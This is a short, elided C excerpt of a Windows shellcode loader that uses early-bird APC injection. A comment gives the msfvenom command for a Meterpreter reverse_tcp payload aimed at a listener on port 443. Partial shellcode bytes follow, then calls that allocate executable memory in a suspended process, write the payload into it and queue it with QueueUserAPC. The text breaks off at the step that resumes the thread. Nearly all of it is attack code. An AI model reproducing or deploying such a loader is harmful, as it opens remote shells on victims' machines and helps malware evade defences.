...
int main() {
    ...
    // Shellcode to execute - Current shellcode generated with msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.0 LPORT=443 -f c
    unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
                                ...
                                "\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x00\x00\x41\x54\x49\x89\xe4"
                                ...
                                "\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5"; // Replace with your shellcode
    
    // 2. Allocate memory in target process
    LPVOID lpRemoteBuf = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 3. Write shellcode to the allocated memory
    WriteProcessMemory(pi.hProcess, lpRemoteBuf, (LPVOID)shellcode, sizeof(shellcode), NULL);

    // 4. Queue the APC (using QueueUserAPC)
    QueueUserAPC((PAPCFUNC)lpRemoteBuf, pi.hThread, NULL);

    // 5. Resume the thread (triggers the APC)
